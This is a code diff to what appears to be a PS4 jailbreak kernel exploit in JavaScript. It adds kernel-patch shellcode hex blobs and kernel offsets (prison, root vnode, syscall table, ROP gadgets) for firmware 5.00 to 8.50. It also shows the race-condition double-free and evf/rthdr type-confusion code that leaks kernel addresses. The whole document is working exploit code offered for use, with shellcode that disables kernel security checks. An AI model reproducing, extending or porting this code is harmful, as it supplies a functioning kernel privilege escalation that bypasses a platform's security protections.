@@ -6,6 +6,20 @@
 // Kernel patch shellcode (hex strings) - patches security checks in kernel
 // These are executed via kexec after jailbreak to enable full functionality
 const kpatch_shellcode = {
+    "5.00": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB04000041B890E9FFFF4881C2A0320100C681BD0A0000EBC6816DA31E00EBC681B1A31E00EBC6812DA41E00EBC68171A41E00EBC6810DA61E00EBC6813DAA1E00EBC681FDAA1E00EBC7819304000000000000C681C5040000EB668981BC0400006689B1B8040000C6817D4A0500EB6689B9F83A1A00664489812A7E2300C78150232B004831C0C3C68110D5130037C68113D5130037C78120C807010200000048899128C80701C7814CC80701010000000F20C0480D000001000F22C031C0C3",
+    "5.03": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB04000041B890E9FFFF4881C2A0320100C681BD0A0000EBC6817DA41E00EBC681C1A41E00EBC6813DA51E00EBC68181A51E00EBC6811DA71E00EBC6814DAB1E00EBC6810DAC1E00EBC7819304000000000000C681C5040000EB668981BC0400006689B1B8040000C6817D4A0500EB6689B9083C1A00664489813A7F2300C78120262B004831C0C3C68120D6130037C68123D6130037C78120C807010200000048899128C80701C7814CC80701010000000F20C0480D000001000F22C031C0C3",
+    "5.50": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2CCAD0000C681ED0A0000EBC6810D594000EBC68151594000EBC681CD594000EBC681115A4000EBC681BD5B4000EBC6816D604000EBC6813D614000EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681CD070100EB6644898198EE0200664489890A390600C781300140004831C0C3C681D9253C0037C681DC253C0037C781D05E110102000000488991D85E1101C781FC5E1101010000000F20C0480D000001000F22C031C0C3",
+    "5.53": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2CCAD0000C681ED0A0000EBC6810D584000EBC68151584000EBC681CD584000EBC68111594000EBC681BD5A4000EBC6816D5F4000EBC6813D604000EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681CD070100EB6644898198EE0200664489890A390600C781300040004831C0C3C681D9243C0037C681DC243C0037C781D05E110102000000488991D85E1101C781FC5E1101010000000F20C0480D000001000F22C031C0C3",
+    "5.55": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2CCAD0000C681ED0A0000EBC681CD5B4000EBC681115C4000EBC6818D5C4000EBC681D15C4000EBC6817D5E4000EBC6812D634000EBC681FD634000EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681CD070100EB6644898198EE0200664489890A390600C781F00340004831C0C3C68199283C0037C6819C283C0037C781D0AE110102000000488991D8AE1101C781FCAE1101010000000F20C0480D000001000F22C031C0C3",
+    "5.56": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C209EF0300C681DD0A0000EBC6814D461100EBC68191461100EBC6810D471100EBC68151471100EBC681FD481100EBC681AD4D1100EBC6817D4E1100EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681ED900200EB6644898158223500664489895AF62700C78110A801004831C0C3C6816D02240037C6817002240037C78150B711010200000048899158B71101C7817CB71101010000000F20C0480D000001000F22C031C0C3",
+    "6.00": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C209EF0300C681DD0A0000EBC6814D461100EBC68191461100EBC6810D471100EBC68151471100EBC681FD481100EBC681AD4D1100EBC6817D4E1100EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681ED900200EB6644898158223500664489895AF62700C78110A801004831C0C3C6816D02240037C6817002240037C78150B711010200000048899158B71101C7817CB71101010000000F20C0480D000001000F22C031C0C3",
+    "6.20": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2AEBC0200C681DD0A0000EBC6814D461100EBC68191461100EBC6810D471100EBC68151471100EBC681FD481100EBC681AD4D1100EBC6817D4E1100EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681ED900200EB6644898178223500664489897AF62700C78110A801004831C0C3C6816D02240037C6817002240037C78150F711010200000048899158F71101C7817CF71101010000000F20C0480D000001000F22C031C0C3",
+    "6.50": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB0000006689810EC5630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C24DA31500C681CD0A0000EBC6814D113C00EBC68191113C00EBC6810D123C00EBC68151123C00EBC681FD133C00EBC681AD183C00EBC6817D193C00EB6689B10FCE6300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C68127BB1000EB66448991081A4500664489991E801D00668981AA851D00C781209F41004831C0C3C6817AB50A0037C6817DB50A0037C78110D211010200000048899118D21101C7813CD21101010000000F20C0480D000001000F22C031C0C3",
+    "6.70": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB000000668981CEC8630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C25DCF0900C681CD0A0000EBC681FD143C00EBC68141153C00EBC681BD153C00EBC68101163C00EBC681AD173C00EBC6815D1C3C00EBC6812D1D3C00EB6689B1CFD16300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C681D7BE1000EB66448991B81D450066448999CE831D006689815A891D00C781D0A241004831C0C3C6817AB50A0037C6817DB50A0037C78110E211010200000048899118E21101C7813CE21101010000000F20C0480D000001000F22C031C0C3",
+    "7.00": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB000000668981CEAC630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C2D2AF0600C681CD0A0000EBC6818DEF0200EBC681D1EF0200EBC6814DF00200EBC68191F00200EBC6813DF20200EBC681EDF60200EBC681BDF70200EB6689B1EFB56300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C681777B0800EB66448991084C260066448999C14E09006689817B540900C781202C2F004831C0C3C68136231D0037C68139231D0037C781705812010200000048899178581201C7819C581201010000000F20C0480D000001000F22C031C0C3",
+    "7.50": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB0000006689819473630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C282F60100C681DD0A0000EBC6814DF72800EBC68191F72800EBC6810DF82800EBC68151F82800EBC681FDF92800EBC681ADFE2800EBC6817DFF2800EB6689B1CF7C6300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C68127A33700EB66448991C814300066448999041E4500668981C4234500C781309A02004831C0C3C6817DB10D0037C68180B10D0037C781502512010200000048899158251201C7817C251201010000000F20C0480D000001000F22C031C0C3",
+    "8.00": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB00000041B8EB00000041B9EB04000041BA90E9FFFF4881C2DC600E0066898154D26200C681CD0A0000EBC6810DE12500EBC68151E12500EBC681CDE12500EBC68111E22500EBC681BDE32500EBC6816DE82500EBC6813DE92500EB6689B13FDB6200C7819004000000000000C681C2040000EB6689B9B904000066448981B5040000C68196D63400EB664489898BC63E0066448991848D3100C6813F953100EBC781C05109004831C0C3C6813AD00F0037C6813DD00F0037C781E0C60F0102000000488991E8C60F01C7810CC70F01010000000F20C0480D000001000F22C031C0C3",
+    "8.50": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB00000041B8EB00000041B9EB04000041BA90E9FFFF4881C24D7F0C0066898174466200C681CD0A0000EBC6813D403A00EBC68181403A00EBC681FD403A00EBC68141413A00EBC681ED423A00EBC6819D473A00EBC6816D483A00EB6689B15F4F6200C7819004000000000000C681C2040000EB6689B9B904000066448981B5040000C681D6F32200EB66448989DBD614006644899174740100C6812F7C0100EBC78140D03A004831C0C3C681EA26080037C681ED26080037C781D0C70F0102000000488991D8C70F01C781FCC70F01010000000F20C0480D000001000F22C031C0C3",
     "9.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b080066448991c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3",
     "9.03": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b08006644899194ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3",
     "9.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00eb664489893b6d19006644899124f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3",
@@ -20,6 +34,7 @@ const kpatch_shellcode = {
 // Mmap RWX patch offsets per firmware (for verification)
 // These are the offsets where 0x33 is patched to 0x37
 const kpatch_mmap_offsets = {
+    // TODO: missing 5.00 to 8.50
     "9.00": [0x156326a, 0x156326d],  // TODO: verify
     "9.03": [0x156262a, 0x156262d],  // TODO: verify
     "9.50": [0x122d7a, 0x122d7d],    // TODO: verify
@@ -30,6 +45,54 @@ const kpatch_mmap_offsets = {
     "11.50": [0x1fa63a, 0x1fa63d],
     "12.00": [0x1fa71a, 0x1fa71d],
 };
+
+const shellcode_fw_map = {
+    "5.00": "5.00",
+    "5.01": "5.00",
+    "5.03": "5.03",
+    "5.05": "5.03",
+    "5.07": "5.03",
+    "5.50": "5.50",
+    "5.53": "5.53",
+    "5.55": "5.55",
+    "5.56": "5.56",
+    "6.00": "6.00",
+    "6.02": "6.00",
+    "6.20": "6.20",
+    "6.50": "6.50",
+    "6.51": "6.50",
+    "6.70": "6.70",
+    "6.71": "6.70",
+    "6.72": "6.70",
+    "7.00": "7.00",
+    "7.01": "7.00",
+    "7.02": "7.00",
+    "7.50": "7.50",
+    "7.51": "7.50",
+    "7.55": "7.50",
+    "8.00": "8.00",
+    "8.01": "8.00",
+    "8.03": "8.00",
+    "8.50": "8.50",
+    "8.52": "8.50",
+    "9.00": "9.00",
+    "9.03": "9.03",
+    "9.04": "9.03",
+    "9.50": "9.50",
+    "9.51": "9.50",
+    "9.60": "9.50",
+    "10.00": "10.00",
+    "10.01": "10.00",
+    "10.50": "10.50",
+    "10.70": "10.50",
+    "10.71": "10.50",
+    "11.00": "11.00",
+    "11.02": "11.02",
+    "11.50": "11.50",
+    "11.52": "11.50",
+    "12.00": "12.00",
+    "12.02": "12.00"
+}
 
 function get_mmap_patch_offsets(fw_version) {
     // Normalize version
@@ -55,18 +118,7 @@ function hexToBytes(hex) {
 
 // Get kernel patch shellcode for firmware version
 function get_kpatch_shellcode(fw_version) {
-    // Normalize version for lookup
-    var lookup_version = fw_version;
-
-    // Map similar versions
-    if (fw_version === "9.04") lookup_version = "9.03";
-    else if (fw_version === "9.51" || fw_version === "9.60") lookup_version = "9.50";
-    else if (fw_version === "10.01") lookup_version = "10.00";
-    else if (fw_version === "10.70" || fw_version === "10.71") lookup_version = "10.50";
-    else if (fw_version === "11.52") lookup_version = "11.50";
-    else if (fw_version === "12.02") lookup_version = "12.00";
-
-    const hex = kpatch_shellcode[lookup_version];
+    const hex = kpatch_shellcode[shellcode_fw_map[fw_version]];
     if (!hex) {
         return null;
     }
@@ -74,6 +126,142 @@ function get_kpatch_shellcode(fw_version) {
 }
 
 // Firmware-specific offsets for PS4
+
+offset_ps4_5_00 = {             // AND 5.01
+    EVF_OFFSET: 0X7B3ED4,
+    PRISON0: 0X10986A0,
+    ROOTVNODE: 0X22C19F0,
+    SYSENT_661: 0X1084200,
+    JMP_RSI_GADGET: 0X13460
+};
+
+offset_ps4_5_03 = {
+    EVF_OFFSET: 0X7B42E4,
+    PRISON0: 0X10986A0,
+    ROOTVNODE: 0X22C1A70,
+    SYSENT_661: 0X1084200,
+    JMP_RSI_GADGET: 0X13460
+};
+
+offset_ps4_5_05 = {             // AND 5.07
+    EVF_OFFSET: 0X7B42A4,
+    PRISON0: 0X10986A0,
+    ROOTVNODE: 0X22C1A70,
+    SYSENT_661: 0X1084200,
+    JMP_RSI_GADGET: 0X13460
+};
+
+offset_ps4_5_50 = {
+    EVF_OFFSET: 0X80EF12,
+    PRISON0: 0X1134180,
+    ROOTVNODE: 0X22EF570,
+    SYSENT_661: 0X111D8B0,
+    JMP_RSI_GADGET: 0XAF8C
+};
+
+offset_ps4_5_53 = {
+    EVF_OFFSET: 0X80EDE2,
+    PRISON0: 0X1134180,
+    ROOTVNODE: 0X22EF570,
+    SYSENT_661: 0X111D8B0,
+    JMP_RSI_GADGET: 0XAF8C
+};
+
+offset_ps4_5_55 = {
+    EVF_OFFSET: 0X80F482,
+    PRISON0: 0X1139180,
+    ROOTVNODE: 0X22F3570,
+    SYSENT_661: 0X11228B0,
+    JMP_RSI_GADGET: 0XAF8C
+};
+
+offset_ps4_5_56 = {
+    EVF_OFFSET: 0X7C8971,
+    PRISON0: 0X1139180,
+    ROOTVNODE: 0X22F3570,
+    SYSENT_661: 0X1123130,
+    JMP_RSI_GADGET: 0X3F0C9
+};
+
+offset_ps4_6_00 = {             // AND 6.02
+    EVF_OFFSET: 0X7C8971,
+    PRISON0: 0X1139458,
+    ROOTVNODE: 0X21BFAC0,
+    SYSENT_661: 0X1123130,
+    JMP_RSI_GADGET: 0X3F0C9
+};
+
+offset_ps4_6_20 = {
+    EVF_OFFSET: 0X7C8E31,
+    PRISON0: 0X113D458,
+    ROOTVNODE: 0X21C3AC0,
+    SYSENT_661: 0X1127130,
+    JMP_RSI_GADGET: 0X2BE6E
+};
+
+offset_ps4_6_50 = {
+    EVF_OFFSET: 0X7C6019,
+    PRISON0: 0X113D4F8,
+    ROOTVNODE: 0X2300320,
+    SYSENT_661: 0X1124BF0,
+    JMP_RSI_GADGET: 0X15A50D
+};
+
+offset_ps4_6_51 = {
+    EVF_OFFSET: 0X7C6099,
+    PRISON0: 0X113D4F8,
+    ROOTVNODE: 0X2300320,
+    SYSENT_661: 0X1124BF0,
+    JMP_RSI_GADGET: 0X15A50D
+};
+
+offset_ps4_6_70 = {             // AND 6.71, 6.72
+    EVF_OFFSET: 0X7C7829,
+    PRISON0: 0X113E518,
+    ROOTVNODE: 0X2300320,
+    SYSENT_661: 0X1125BF0,
+    JMP_RSI_GADGET: 0X9D11D
+};
+
+offset_ps4_7_00 = {             // AND 7.01, 7.02
+    EVF_OFFSET: 0X7F92CB,
+    PRISON0: 0X113E398,
+    ROOTVNODE: 0X22C5750,
+    SYSENT_661: 0X112D250,
+    JMP_RSI_GADGET: 0X6B192
+};
+
+offset_ps4_7_50 = {
+    EVF_OFFSET: 0X79A92E,
+    PRISON0: 0X113B728,
+    ROOTVNODE: 0X1B463E0,
+    SYSENT_661: 0X1129F30,
+    JMP_RSI_GADGET: 0X1F842
+};
+
+offset_ps4_7_51 = {             // AND 7.55
+    EVF_OFFSET: 0X79A96E,
+    PRISON0: 0X113B728,
+    ROOTVNODE: 0X1B463E0,
+    SYSENT_661: 0X1129F30,
+    JMP_RSI_GADGET: 0X1F842
+};
+
+offset_ps4_8_00 = {             // AND 8.01, 8.02, 8.03
+    EVF_OFFSET: 0X7EDCFF,
+    PRISON0: 0X111A7D0,
+    ROOTVNODE: 0X1B8C730,
+    SYSENT_661: 0X11040C0,
+    JMP_RSI_GADGET: 0XE629C
+};
+
+offset_ps4_8_50 = {             // AND 8.52
+    EVF_OFFSET: 0X7DA91C,
+    PRISON0: 0X111A8F0,
+    ROOTVNODE: 0X1C66150,
+    SYSENT_661: 0X11041B0,
+    JMP_RSI_GADGET: 0XC810D
+};
 
 offset_ps4_9_00 = {
     EVF_OFFSET: 0x7F6F27,
@@ -158,6 +346,35 @@ offset_ps4_12_00 = {
 
 // Map firmware versions to offset objects
 ps4_kernel_offset_list = {
+    "5.00": offset_ps4_5_00,
+    "5.01": offset_ps4_5_00,
+    "5.03": offset_ps4_5_03,
+    "5.05": offset_ps4_5_05,
+    "5.07": offset_ps4_5_05,
+    "5.50": offset_ps4_5_50,
+    "5.53": offset_ps4_5_53,
+    "5.55": offset_ps4_5_55,
+    "5.56": offset_ps4_5_56,
+    "6.00": offset_ps4_6_00,
+    "6.02": offset_ps4_6_00,
+    "6.20": offset_ps4_6_20,
+    "6.50": offset_ps4_6_50,
+    "6.51": offset_ps4_6_51,
+    "6.70": offset_ps4_6_70,
+    "6.71": offset_ps4_6_70,
+    "6.72": offset_ps4_6_70,
+    "7.00": offset_ps4_7_00,
+    "7.01": offset_ps4_7_00,
+    "7.02": offset_ps4_7_00,
+    "7.50": offset_ps4_7_50,
+    "7.51": offset_ps4_7_51,
+    "7.55": offset_ps4_7_51,
+    "8.00": offset_ps4_8_00,
+    "8.01": offset_ps4_8_00,
+    "8.02": offset_ps4_8_00,
+    "8.03": offset_ps4_8_00,
+    "8.50": offset_ps4_8_50,
+    "8.52": offset_ps4_8_50,
     "9.00": offset_ps4_9_00,
     "9.03": offset_ps4_9_03,
     "9.04": offset_ps4_9_03,
@@ -440,7 +657,7 @@ function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
     const name_len = new BigInt(name.length);
    
     if (sysctl(translate_name_mib, 2, mib, size, name_addr, name_len) === new BigInt(0xffffffff, 0xffffffff)) {
-        debug("failed to translate sysctl name to mib (" + name + ")");
+        log("failed to translate sysctl name to mib (" + name + ")");
     }
     
     if (sysctl(mib, 2, oldp, oldp_len, newp, newp_len) === new BigInt(0xffffffff, 0xffffffff)) {
@@ -458,7 +675,7 @@ function get_fwversion() {
         const byte1 = Number(read8(buf.add(2)));  // Minor version (first byte)
         const byte2 = Number(read8(buf.add(3)));  // Major version (second byte)
         
-        const version = byte2.toString(16).padStart(2, '0') + '.' + byte1.toString(16).padStart(2, '0');
+        const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
         return version;
     }
     
@@ -652,11 +869,11 @@ function create_pipe() {
 
 function spawn_thread(rop_race1_array) {
     const rop_race1_addr = malloc(0x400); // ROP Stack plus extra size
-    //debug("This is rop_race1_array.length " + rop_race1_array.length);
+    //log("This is rop_race1_array.length " + rop_race1_array.length);
     // Fill ROP Stack
     for(var i=0 ; i < rop_race1_array.length ; i++) {
         write64(rop_race1_addr.add(i*8), new BigInt(rop_race1_array[i]));
-        //debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
+        //log("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
     }
 
     const jmpbuf = malloc(0x60);
@@ -742,19 +959,19 @@ function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {
 
 function race_one(req_addr, tcp_sd, sds) {
     try {
-        //debug("this is ready_signal and deletion_signal " + hex(ready_signal) + " " + hex(deletion_signal));
+        //log("this is ready_signal and deletion_signal " + hex(ready_signal) + " " + hex(deletion_signal));
         write64(ready_signal, 0);
         write64(deletion_signal, 0);
 
         const sce_errs = malloc(0x100);  // 8 bytes for errs + scratch for TCP_INFO
         write32(sce_errs,        0xFFFFFFFF);  // -1
         write32(sce_errs.add(4), 0xFFFFFFFF);  // -1
-        //debug("race_one before pipe");
+        //log("race_one before pipe");
         var pipe_fds = create_pipe();
         const pipe_read_fd = pipe_fds[0];
         const pipe_write_fd = pipe_fds[1];
         //const [pipe_read_fd, pipe_write_fd] = create_pipe();
-        //debug("race_one after pipe");
+        //log("race_one after pipe");
 
         var rop_race1 = [];
 
@@ -826,50 +1043,50 @@ function race_one(req_addr, tcp_sd, sds) {
         rop_race1.push(new BigInt(0));
         rop_race1.push(thr_exit_wrapper);
 
-        //debug("race_one before spawnt_thread");
+        //log("race_one before spawnt_thread");
         const thr_tid = spawn_thread(rop_race1);
-        //debug("race_one after spawnt_thread");
+        //log("race_one after spawnt_thread");
         
         // Wait for thread to signal ready
         wait_for(ready_signal, 1);
-        //debug("race_one after wait_for");
+        //log("race_one after wait_for");
 
         const suspend_res = call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid);
-        debug("Suspend result: " + hex(suspend_res));
-        //debug("race_one after call_suspend_chain");
+        log("Suspend result: " + hex(suspend_res));
+        //log("race_one after call_suspend_chain");
 
         const scratch = sce_errs.add(8);  // Use offset for scratch space
         aio_multi_poll_fun(req_addr, 1, scratch);
         const poll_res = read32(scratch);
-        debug("poll_res after suspend: " + hex(poll_res));
-        //debug("race_one after aio_multi_poll_fun");
+        log("poll_res after suspend: " + hex(poll_res));
+        //log("race_one after aio_multi_poll_fun");
 
         get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, scratch, size_tcp_info);
         const tcp_state = read8(scratch);
-        debug("tcp_state: " + hex(tcp_state));
+        log("tcp_state: " + hex(tcp_state));
 
         var won_race = false;
 
         if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
             aio_multi_delete_fun(req_addr, 1, sce_errs);
             won_race = true;
-            debug("Race won!");
+            log("Race won!");
         }else {
-            debug("Race not won (poll_res=" + hex(poll_res) + " tcp_state=" + hex(tcp_state) + ")");
+            log("Race not won (poll_res=" + hex(poll_res) + " tcp_state=" + hex(tcp_state) + ")");
         }
 
         const resume_result = thr_resume_ucontext(thr_tid);
-        debug("Resume " + hex(thr_tid) + ": " + resume_result);
-        //debug("race_one after thr_resume_ucontext");
+        log("Resume " + hex(thr_tid) + ": " + resume_result);
+        //log("race_one after thr_resume_ucontext");
         nanosleep_fun(5);
 
         if (won_race) {
             const err_main_thr = read32(sce_errs);
             const err_worker_thr = read32(sce_errs.add(4));
-            debug("sce_errs: main=" + hex(err_main_thr) + " worker=" + hex(err_worker_thr));
+            log("sce_errs: main=" + hex(err_main_thr) + " worker=" + hex(err_worker_thr));
 
             if (err_main_thr === err_worker_thr && err_main_thr === 0) {
-                debug("Double-free successful, making aliased rthdrs...");
+                log("Double-free successful, making aliased rthdrs...");
                 const sd_pair = make_aliased_rthdrs(sds);
 
                 if (sd_pair !== null) {
@@ -877,10 +1094,10 @@ function race_one(req_addr, tcp_sd, sds) {
                     close(pipe_write_fd);
                     return sd_pair;
                 } else {
-                    debug("Failed to make aliased rthdrs");
+                    log("Failed to make aliased rthdrs");
                 }
             } else {
-                debug("sce_errs mismatch - race failed");
+                log("sce_errs mismatch - race failed");
             }
         }
 
@@ -890,7 +1107,7 @@ function race_one(req_addr, tcp_sd, sds) {
         return null;
 
     } catch (e) {
-        debug("  race_one error: " + e.message);
+        log("  race_one error: " + e.message);
         return null;
     }
 }
@@ -964,7 +1181,7 @@ function make_aliased_rthdrs(sds) {
                     const aliased_idx = marker - 1;
                     const aliased_sd = Number(sds[aliased_idx]);
                     if (aliased_idx >= 0 && aliased_idx < sds.length && !sds[aliased_idx].eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) { // sds[aliased_idx] !== 0xffffffffffffffff
-                        debug("  Aliased pktopts found");
+                        log("  Aliased pktopts found");
                         const sd_pair = [sd, aliased_sd];
                         const max_idx = Math.max(i-1, aliased_idx);
                         const min_idx = Math.min(i-1, aliased_idx);
@@ -999,7 +1216,7 @@ function setup() {
 
         pin_to_core(MAIN_CORE);
         set_rtprio(MAIN_RTPRIO);
-        debug("  Previous core " + prev_core + " Pinned to core " + MAIN_CORE);
+        log("  Previous core " + prev_core + " Pinned to core " + MAIN_CORE);
 
         const sockpair = malloc(8);
         ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair);
@@ -1024,7 +1241,7 @@ function setup() {
         }
 
         block_id = read32(block_id_buf);
-        debug("  AIO workers ready");
+        log("  AIO workers ready");
 
         const num_reqs = 3;
         const groom_reqs = make_reqs1(num_reqs);
@@ -1055,12 +1272,12 @@ function setup() {
             }
             sds_alt.push(sd);
         }
-        debug("  Sockets allocated (" + NUM_SDS + " + " + NUM_SDS_ALT + ")");
+        log("  Sockets allocated (" + NUM_SDS + " + " + NUM_SDS_ALT + ")");
 
         return true;
 
     } catch (e) {
-        debug("  Setup failed: " + e.message);
+        log("  Setup failed: " + e.message);
         return false;
     }
 }
@@ -1081,7 +1298,7 @@ function double_free_reqs2() {
         ret = bind(sd_listen, server_addr, 16);
 
         if (!ret.eq(BigInt.Zero)) {
-            debug("bind failed");
+            log("bind failed");
             close(sd_listen);
             return null;
         }
@@ -1090,15 +1307,15 @@ function double_free_reqs2() {
         write32(addr_len, 16);
         ret = getsockname(sd_listen, server_addr, addr_len)
         if (!ret.eq(BigInt.Zero)) {
-            debug("getsockname failed");
+            log("getsockname failed");
             close(sd_listen);
             return null;
         }
-        debug("Bound to port: " + Number(read16(server_addr.add(2))));
+        log("Bound to port: " + Number(read16(server_addr.add(2))));
 
         ret = listen(sd_listen, 1)
         if (!ret.eq(BigInt.Zero)) {
-            debug("listen failed");
+            log("listen failed");
             close(sd_listen);
             return null;
         }
@@ -1112,7 +1329,7 @@ function double_free_reqs2() {
         const cmd       = AIO_CMD_MULTI_READ;
 
         for (var attempt = 1; attempt <= NUM_RACES; attempt++) {
-            //debug("Race attempt " + attempt + "/" + NUM_RACES);
+            //log("Race attempt " + attempt + "/" + NUM_RACES);
 
             const sd_client = new_tcp_socket();
 
@@ -1123,12 +1340,12 @@ function double_free_reqs2() {
             }
 
             const sd_conn = accept(sd_listen, 0, 0);
-            //debug("Race attempt after accept")
+            //log("Race attempt after accept")
             const linger_buf = malloc(8);
             write32(linger_buf, 1);
             write32(linger_buf.add(4), 1);
             set_sockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8);
-            //debug("Race attempt after set_sockopt")
+            //log("Race attempt after set_sockopt")
             write32(reqs.add(which_req * 0x28 + 0x20), sd_client);
 
             ret = aio_submit_cmd_fun(cmd, reqs, num_reqs, 3, aio_ids);
@@ -1137,21 +1354,21 @@ function double_free_reqs2() {
                 close(sd_conn);
                 continue;
             }
-            //debug("Race attempt after aio_submit_cmd_fun")
+            //log("Race attempt after aio_submit_cmd_fun")
             aio_multi_cancel_fun(aio_ids, num_reqs, errors);
-            //debug("Race attempt after aio_multi_cancel_fun")
+            //log("Race attempt after aio_multi_cancel_fun")
             aio_multi_poll_fun(aio_ids, num_reqs, errors);
-            //debug("Race attempt after aio_multi_poll_fun")
+            //log("Race attempt after aio_multi_poll_fun")
             
             close(sd_client);
-            //debug("Race attempt before race_one")
+            //log("Race attempt before race_one")
             const sd_pair = race_one(req_addr, sd_conn, sds);
 
             aio_multi_delete_fun(aio_ids, num_reqs, errors);
             close(sd_conn);
 
             if (sd_pair !== null) {
-                debug("Won race at attempt " + attempt);
+                log("Won race at attempt " + attempt);
                 close(sd_listen);
                 return sd_pair;
             }
@@ -1161,7 +1378,7 @@ function double_free_reqs2() {
         return null;
 
     } catch (e) {
-        debug("Stage 1 error: " + e.message);
+        log("Stage 1 error: " + e.message);
         return null;
     }
 }
@@ -1249,7 +1466,7 @@ function leak_kernel_addrs(sd_pair, sds) {
     const buflen = 0x80 * LEAK_LEN;
     const buf = malloc(buflen);
 
-    debug("Confusing evf with rthdr...");
+    log("Confusing evf with rthdr...");
 
     const name = malloc(1);
 
@@ -1292,23 +1509,23 @@ function leak_kernel_addrs(sd_pair, sds) {
         }
 
         if (evf !== null) {
-            debug("Confused rthdr and evf at attempt: " + i);
+            log("Confused rthdr and evf at attempt: " + i);
             break;
         }
     }
 
     if (evf === null) {
-        debug("Failed to confuse evf and rthdr");
+        log("Failed to confuse evf and rthdr");
         return null;
     }
 
     set_evf_flags(evf, 0xff00);
 
     const kernel_addr = read64(buf.add(0x28));
-    debug("\"evf cv\" string addr: " + hex(kernel_addr));
+    log("\"evf cv\" string addr: " + hex(kernel_addr));
 
     const kbuf_addr = read64(buf.add(0x40)).sub(0x38); // -0x38
-    debug("Kernel buffer addr: " + hex(kbuf_addr));
+    log("Kernel buffer addr: " + hex(kbuf_addr));
 
     const wbufsz = 0x80;
